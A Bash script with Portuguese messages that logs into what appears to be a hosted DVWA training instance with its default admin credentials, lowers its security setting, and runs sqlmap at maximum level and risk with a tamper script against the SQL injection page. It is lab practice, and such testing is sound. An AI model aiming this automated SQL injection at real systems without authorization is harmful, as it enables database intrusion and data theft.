#!/usr/bin/env bash
set -euo pipefail

TARGET_HOST="${DVWA_HOST:-web-dvwa-production.up.railway.app}"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
COOKIE_FILE="$SCRIPT_DIR/cookies.txt"

echo "[*] Iniciando sessão em https://$TARGET_HOST/login.php (gera PHPSESSID)…"
curl -ks -c "$COOKIE_FILE" "https://$TARGET_HOST/login.php" > /dev/null

echo "[*] Autenticando no DVWA (POST login)…"
curl -ks -b "$COOKIE_FILE" -c "$COOKIE_FILE" -L \
     -d "username=admin&password=password&Login=Login" \
     "https://$TARGET_HOST/login.php" > /dev/null

echo "[*] Definindo segurança para LOW…"
curl -ks -b "$COOKIE_FILE" -L \
     "https://$TARGET_HOST/security.php?security=low" > /dev/null

echo "[DEBUG] cookies em $COOKIE_FILE:" >&2
cat "$COOKIE_FILE" >&2

PHPSESSID=$(grep PHPSESSID "$COOKIE_FILE" | awk '{print $NF}')
[ -n "$PHPSESSID" ] || { echo "[ERROR] PHPSESSID não encontrado" >&2; exit 1; }
COOKIE="security=low; PHPSESSID=$PHPSESSID"

INJECTION_URL="https://$TARGET_HOST/vulnerabilities/sqli/?id=1&Submit=Submit"
echo "[*] Iniciando análise SQLi com sqlmap contra $INJECTION_URL…"
time sqlmap \
  --batch \
  --answers="follow=Y" \
  --ignore-code=502 \
  --level=5 \
  --risk=3 \
  --tamper=space2comment \
  -u "$INJECTION_URL" \
  --cookie "$COOKIE"

echo "[✓] Análise SQLi concluída."
